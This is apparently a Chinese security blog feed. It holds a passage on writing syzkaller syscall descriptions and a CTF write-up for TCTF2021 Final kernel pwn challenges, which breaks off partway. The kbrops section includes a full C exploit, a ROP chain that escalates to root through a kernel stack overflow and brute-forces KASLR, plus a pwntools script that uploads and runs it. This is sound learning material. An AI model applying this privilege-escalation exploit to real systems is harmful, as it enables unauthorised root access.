href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md#tips">这里</a>是一些 tips</p><h2 id="编写并使用描述文件"><a href="#编写并使用描述文件" class="headerlink" title="编写并使用描述文件"></a>编写并使用描述文件</h2><h3 id="Step-I-编写描述文件"><a href="#Step-I-编写描述文件" class="headerlink" title="Step I.编写描述文件"></a>Step I.编写描述文件</h3><p>我们需要在 syzkaller 目录下的 <code>syzkaller/sys/linux/</code> 这个目录下面新建我们自己的描述文件，比如说笔者新建一个 <code>a3_handsome.txt</code> 文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line"></span><br><span class="line">resource a3fd[int64]</span><br><span class="line"></span><br><span class="line">open$a3proc(file ptr[in, string[&quot;/dev/tty&quot;]], flags flags[a3_open_flags]) a3fd</span><br><span class="line">read$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line">write$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line">close$a3proc(fd a3fd)</span><br><span class="line"></span><br><span class="line">a3_open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><blockquote><p>随便写的，没有任何的针对性设计</p></blockquote><p>在这里变种名为 <code>a3proc</code>，可以理解为笔者自己取的别名，这是因为若不同的描述文件中存在相同的系统调用则编译时会发生冲突</p><h3 id="Step-II-编译-syz-extract-与-syz-sysgen"><a href="#Step-II-编译-syz-extract-与-syz-sysgen" class="headerlink" title="Step II.编译 syz-extract 与 syz-sysgen"></a>Step II.编译 syz-extract 与 syz-sysgen</h3><p>接下来我们需要编译 <code>syz-extract</code> 与 <code>syz-sysgen</code>，从而应用我们新编写的描述文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make bin/syz-extract</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make bin/syz-sysgen<span class="comment"># no need for syzkaller in new version</span></span></span><br></pre></td></tr></table></figure><ul><li>syz-extract 用以提取引入的内核头文件中的 define 常量等，生成 <code>.const</code> 文件</li><li>syz-sysgen 用以结合 <code>.txt</code> 文件与 <code>.const</code> 文件进行语法分析和语义分析生成 AST ，最后生成 <code>.go</code> 文件</li></ul><p>对于版本较新的 syzkaller ，其在编译时会默认编译 syz-sysgen，因此我们只需要手动编译 syz-extract 即可</p><h3 id="Step-III-处理新规则文件"><a href="#Step-III-处理新规则文件" class="headerlink" title="Step III.处理新规则文件"></a>Step III.处理新规则文件</h3><p>使用如下命令处理我们刚刚写的规则文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bin/syz-extract -os linux -<span class="built_in">arch</span> <span class="variable">$ARCH</span> -sourcedir <span class="variable">$KSRC</span> -builddir <span class="variable">$LINUXBLD</span> &lt;new&gt;.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bin/syz-sysgen<span class="comment"># no need for syzkaller in new version</span></span></span><br></pre></td></tr></table></figure><ul><li><code>$ARCH</code> 应为你的目标架构，可选项有 <code>amd64</code>, <code>386</code> <code>arm64</code>, <code>arm</code>, <code>ppc64le</code>, <code>mips64le</code></li><li><code>$KSRC</code> 应为 fuzz 的内核的源码目录</li><li><code>$LINUXBLD</code> 应为你的编译目录，为可选项（-builddir）</li><li><code>&lt;new&gt;.txt</code> 就是你刚刚编写的规则文件的文件名</li></ul><p>会在 <code>syzkaller/sys/linux</code> 下生成 <code>.const</code> 文件提取出常量，在正式编译时会进行替换，例如笔者上面给出的例程生成的 <code>.const</code> 文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Code generated by syz-sysgen. DO NOT EDIT.</span><br><span class="line">arches = amd64</span><br><span class="line">FASYNC = amd64:8192</span><br><span class="line">O_APPEND = amd64:1024</span><br><span class="line">O_CLOEXEC = amd64:524288</span><br><span class="line">O_CREAT = amd64:64</span><br><span class="line">O_DIRECT = amd64:16384</span><br><span class="line">O_DIRECTORY = amd64:65536</span><br><span class="line">O_EXCL = amd64:128</span><br><span class="line">O_LARGEFILE = amd64:32768</span><br><span class="line">O_NOATIME = amd64:262144</span><br><span class="line">O_NOCTTY = amd64:256</span><br><span class="line">O_NOFOLLOW = amd64:131072</span><br><span class="line">O_NONBLOCK = amd64:2048</span><br><span class="line">O_PATH = amd64:2097152</span><br><span class="line">O_RDWR = amd64:2</span><br><span class="line">O_SYNC = amd64:1052672</span><br><span class="line">O_TRUNC = amd64:512</span><br><span class="line">O_WRONLY = amd64:1</span><br><span class="line">__NR_open = amd64:2</span><br><span class="line">__NR_read = amd64:0</span><br><span class="line">__NR_write = amd64:1</span><br><span class="line">__O_TMPFILE = amd64:4194304</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Step-IV-重新编译-syzkaller"><a href="#Step-IV-重新编译-syzkaller" class="headerlink" title="Step IV.重新编译 syzkaller"></a>Step IV.重新编译 syzkaller</h3><p>命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make generate</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><h3 id="Step-V-修改配置文件，启动-syzkaller"><a href="#Step-V-修改配置文件，启动-syzkaller" class="headerlink" title="Step V.修改配置文件，启动 syzkaller"></a>Step V.修改配置文件，启动 syzkaller</h3><p>前面我们命名了 <code>a3proc</code> ，因此我们还需要在配置文件中进行 enable，在你的 <code>.cfg</code> 文件中添加这一项：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;open$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;read$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;write$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;close$a3proc&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>之后按惯例启动即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span></span><br></pre></td></tr></table></figure><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="*工作原理"></a><em>*工作原理</em></h2><p>当我们使用 syzlang 编写好模板之后，这些系统调用模板会通过 <strong>syz-extract</strong> 和 <strong>syz-sysgen</strong> 翻译为 syzkaller 能够读懂的代码，笔者这里简述一下其原理</p><blockquote><p>这里你可能需要一点编译原理的知识，不过笔者相信大家编译原理应当都及格了（笑）</p><blockquote><p><del>什么？你说你还没上这门课</del></p><blockquote><p><del>什么？用 syzkaller 挖洞只要会写 syzlang 就行了，根本不需要理解他的原理</del></p></blockquote></blockquote><p>简要而言，从源代码到可执行文件大概有如下过程：</p><ul><li>词法分析（lexical analysis）：扫描器（scanner，通常是一个有限状态自动机）从源码文本中逐字符读入，过滤掉注释，将词素映射为词法单元，生成符号表，建立映射，最终输出词素序列</li><li>语法分析（syntax analysis）：语法分析器从词法分析器中获取词素序列，构建树形的中间表示：通常是抽象语法树（abstract syntax tree），树形中间节点表示运算分量，最终输出被称之为词法单元流的语法树</li><li>语义分析（semantic analysis）：语义分析器使用语法树与符号表检查源程序的语义一致性，例如一个整数和一个字符串相加是符合语法规则的，但对于大部分语言而言这并不是一个合法的运算，因此不符合语义规则（<del>什么？你说你用 JavaScript</del>）</li><li><em>中间代码生成与优化：中间代码生成器通过语义分析的结果生成对应的中间代码（例如三地址码），并进行一定的优化</em></li><li><em>代码生成：由代码生成器将中间代码转为可执行代码</em></li></ul></blockquote><h3 id="syz-extract"><a href="#syz-extract" class="headerlink" title="syz-extract"></a>syz-extract</h3><p>第一步是从内核源文件中提取符号常量的值：<code>syz-extract</code> 会根据 syzlang 文件从内核源文件中提取出使用的对应的宏、系统调用号等的值，生成 <code>.const</code> 文件</p><h3 id="syz-sysgen"><a href="#syz-sysgen" class="headerlink" title="syz-sysgen"></a>syz-sysgen</h3><p>第二步便是将描述翻译成 Golang 代码：<code>syz-sysgen</code> 通过 syzlang 文件与 .const 文件进行语法分析与语义分析，生成抽象语法树，最终生成供 syzkaller 使用的 golang 代码，分为如下四个步骤：</p><ul><li><strong>assignSyscallNumbers</strong>：分配系统调用号，检测不支持的系统调用并丢弃</li><li><strong>patchConsts</strong>：将 AST 中的常量替换为对应的值</li><li><strong>check</strong>：进行语义分析</li><li><strong>genSyscalls</strong>：从 AST 生成 prog 对象</li></ul><h1 id="0x04-实战：用-syzkaller-挖掘出-CVE-20"><a href="#0x04-实战：用-syzkaller-挖掘出-CVE-20" class="headerlink" title="0x04.实战：用 syzkaller 挖掘出 CVE-20??-????"></a><del>0x04.实战：用 syzkaller 挖掘出 CVE-20??-????</del></h1><p><del>CVE-20??-???? 是由于 ?? 原因造成的内核空间中的 ??，笔者接下来将尝试使用 syzkaller 来挖掘出该漏洞</del></p><blockquote><p>🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;尝试遍历所有的世界线&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="漏洞挖掘" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解</title>
    <link href="http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/"/>
    <id>http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/</id>
    <published>2021-10-30T20:57:30.000Z</published>
    <updated>2022-03-18T00:17:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>欧皇与非酋的对决</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">官方题解见此处</a></p><p>前些日子（<del>好像是上个月的事情了</del>）打了 TCTF 2021 FINAL，其中刚好有两道 Linux kernel pwn 题，笔者在比赛期间没有多少头绪，最近趁有时间复现了一下</p><h1 id="0x01-kbrops"><a href="#0x01-kbrops" class="headerlink" title="0x01.kbrops"></a>0x01.kbrops</h1><blockquote><p>这个题目比赛时没做出来，<del>笔者原以为会有一种很高端很 nb 的解法，但是后面发现大家的解法都是嗯爆破…</del>赛后看了其他选手的题解发现比想象中简单太多了…签到题难度都算不上…<strong>但是很屑</strong></p><blockquote><p><del>大一的小朋友都能做出来的屑题，笔者不知道为什么会出现在 TCTF FINAL 中</del></p><blockquote><p><del>什么，你问为什么新星赛里这道题是 0 解？</del></p><blockquote><p><del>可能是因为大家都太非了吧</del></p></blockquote></blockquote></blockquote></blockquote><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>查看  <code>/sys/devices/system/cpu/vulnerabilities/ </code></p><p><img src="https://i.loli.net/2021/10/28/6cgnhXyrz2uLIaF.png" alt="image.png"></p><p>开启了 KPTI（内核页表隔离，一般简称页表隔离（PTI），笔者更喜欢用全称）</p><p>查看启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">cd</span> `<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti quiet oops=panic panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>开了 smap、smep、kaslr 保护</p><p>在这里并没有像常规的 kernel pwn 那样把 flag 权限设为 root 600 放在文件系统里，而是将 flag 作为一个设备载入，因此我们需要读取 <code>/dev/sda</code> 以获取 flag，仍然需要 root 权限</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><img src="https://i.loli.net/2021/10/27/HcCDmWho3EVfenu.png" alt="image.png"></p><p>整个程序只定义了一个 ioctl 的 0x666 功能，会取我们传入的前两个字节作为后续拷贝的 size，之后 kmalloc 一个 object，从我们传入的第三个字节开始拷贝，之后再从 object 拷贝到栈上，因为两个字节最大就是 0xffff，所以这里直接就有一个裸的栈溢出</p><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p>既然目前有了栈溢出，而且没有 stack canary 保护，比较朴素的提权方法就是执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 提权到 root，但是由于开启了 kaslr，因此我们还需要知道 kernel offset，但是毫无疑问的是只有一个裸的溢出是没法让我们直接泄漏出内核中的数据的</p><p>这里 r3kapig 给出的解法是<strong>假装他没有这个 kaslr，然后直接硬打</strong>，据称大概试个几百次就能成功</p><blockquote><p>这里放笔者某位朋友的一句名言（</p><p><img src="https://i.loli.net/2021/10/28/AenCihQc1rldLFw.png" alt="image.png"></p></blockquote><p>赛后在 discord 群组中讨论，得知 kaslr 的随机化只有 9位，可以直接进行爆破</p><p><img src="https://i.loli.net/2021/10/31/RhZDQfjqnNr3ozt.png" alt="image.png"></p><p>笔者写了个爆破偏移用的 exp ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81090c20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810909b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81001619</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RET 0xffffffff81b66d10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff8102984b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *buf;</span><br><span class="line">    <span class="type">size_t</span>  *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">int</span>     i;</span><br><span class="line">    <span class="type">int</span>     chal_fd;</span><br><span class="line">    <span class="type">size_t</span>  offset;</span><br><span class="line"></span><br><span class="line">    offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line">    saveStatus();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = (<span class="type">size_t</span>*)(buf + <span class="number">0x102</span>);</span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// padding</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// rbp</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = POP_RDI_RET + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = COMMIT_CREDS + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_cs;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_rflags;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_sp;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_ss;</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">short</span> *)(buf))[<span class="number">0</span>] = <span class="number">0x112</span> + i * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    chal_fd = open(<span class="string">&quot;/proc/chal&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(chal_fd, <span class="number">0x666</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里 ROP 链布局中 <code>prepare_kernel_cred</code> 后直接就到 <code>commit_creds</code> 是因为经过笔者调试发现在执行完 <code>prepare_kernel_cred</code> 后此时的 rax 与 rdi 都指向 root cred，因此不需要再 <code>mov rdi, rax</code></p><p><img src="https://i.loli.net/2021/10/28/Tud1Lb8SkrXycxt.png"></p></blockquote><p>打远程用的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/28/pBTRsQiA9HdaX16.png" alt="image.png"></p><p>反正笔者在本地没打通过，<del>属于是屑题</del></p><blockquote><p>笔者原本以为<strong>会有一种特别高端特别 NB 的方法来绕过 KASLR，实现 Kernel BROP</strong>，后面发现<strong>纯粹就拼脸</strong>，脸好就能拿到flag</p></blockquote><blockquote><p>r3kapig 的 wp 上还展示了一个“小技巧”：众所周知在开启 KPTI 的情况下直接返回用户态会 segmentation fault，这个时候我们可以<strong>把原来的返回地址 getRootShell 函数设为 SIGSEGV 信号的处理函数</strong>，这样原先的 <code>swapgs ; iretq</code> 的方法就可以继续用了</p><p><del>那为什么不直接用  swapgs_restore_regs_and_return_to_usermode 呢</del></p></blockquote><h1 id="0x02-kernote"><a href="#0x02-kernote" class="headerlink" title="0x02.kernote"></a>0x02.kernote</h1><h2 id="一、题目分析-1"><a href="#一、题目分析-1" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>这一题的题解笔者主要还是参照着官方的题解来写的，是本场比赛中给笔者带来收获最大的一道 kernel pwn 题</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>与一般的 kernel pwn 题不同的是，这一次给出的文件系统不是简陋的 ramfs 而是常规的 ext4 镜像文件，我们可以使用 <code>mount</code> 命令将其挂载以查看并修改其内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 